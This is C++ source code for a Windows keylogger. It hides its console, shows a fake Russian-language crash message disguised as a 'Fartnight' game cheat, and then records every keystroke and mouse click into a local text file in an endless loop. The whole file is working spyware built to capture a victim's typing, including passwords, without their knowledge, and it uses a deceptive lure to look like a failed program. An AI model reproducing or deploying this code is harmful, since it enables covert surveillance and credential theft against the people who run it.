#include <iostream>
#include <Windows.h>
#include <fstream>

using namespace std;

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	ofstream txt("rofl.txt");
	MessageBox(0, L"Ошибка при запуске приложения (0xc00007b). Для выхода из приложения нажмите кнопку ''ОК''", L"Fartnight_cheat.exe - Ошибка приложения", MB_OK | MB_ICONSTOP);//write here anything   you want(MB_ICONSTOP = error icon)
	while (true)
	{
		Sleep(1);
		for (size_t button = 1; button < 128; button++)
		{
			if (GetAsyncKeyState(button) == -32767)
			{
				switch (button)//was taken from http://www.vsokovikov.narod.ru/New_MSDN_API/Other/virtual_key_code.htm
				{
				case 1:
					txt << "<left_m>";
					break;
				case 2:
					txt << "<right_m>";
					break;
				case 4:
					txt << "<middle_m>";
					break;
				case 8:
					txt << "<Backspace>";
					break;
				case VK_SHIFT:
					txt << "<Shift>";
					break;
				case VK_CONTROL:
					txt << "<Ctrl>";
					break;
				case VK_MENU:
					txt << "<Alt>";
					break;
				case VK_CAPITAL:
					txt << "<Caps_Lock>";
					cout << "<Caps_Lock>" << endl;
					break;
				case VK_RETURN:
					txt << endl << "<Enter>" << endl;
					break;
				case VK_SPACE:
					txt << "< >" ;
					break;
				case VK_SNAPSHOT:
					txt << "<PrtSc>";
					cout << "<PrtSc>" << endl;
					break; 
				case 0x21: //VK_PRIOR
					txt << "<Page_Up>";
					cout << "<Page_Up>" << endl;
					break;
				case VK_NEXT:
					txt << "<Page_Down>"; 
					break;
				case VK_TAB:
					txt << "<Tab>"; 
					cout << "<Tab>" << endl;
					break;
				case VK_DELETE:
					txt << "<Delete>"; 
					cout << "<Delete>" << endl;
					break;
				case VK_ESCAPE:
					txt << "<Esc>";
					cout << "<Esc>" << endl;
					break;
				case VK_F1:
					txt << "<F1>";
					cout << "<F1>" << endl;
					break;
				case VK_F2:
					txt << "<F2>";
					cout << "<F2>" << endl;
					break;
				case VK_F3:
					txt << "<F3>";
					cout << "<F3>" << endl;
					break;
				case VK_F4:
					txt << "<F4>";
					cout << "<F4>" << endl;
					break;
				case VK_F5:
					txt << "<F5>";
					cout << "<F5>" << endl;
					break;
				case VK_F6:
					txt << "<F6>";
					cout << "<F6>" << endl;
					break;
				case VK_F7:
					txt << "<F7>";
					cout << "<F7>" << endl;
					break;
				case VK_F8:
					txt << "<F8>";
					cout << "<F8>" << endl;
					break;
				case VK_F9:
					txt << "<F9>";
					cout << "<F9>" << endl;
					break;
				case VK_F10:
					txt << "<F10>";
					cout << "<F10>" << endl;
					break;
				case VK_F11:
					txt << "<F11>";
					cout << "<F11>" << endl;
					break;
				case VK_F12:
					txt << "<F12>";
					cout << "<F12>" << endl;
					break;

				default:
					txt << char(button);
					cout << char(button) << endl;
					break;
				}		
			}
		}
	}
}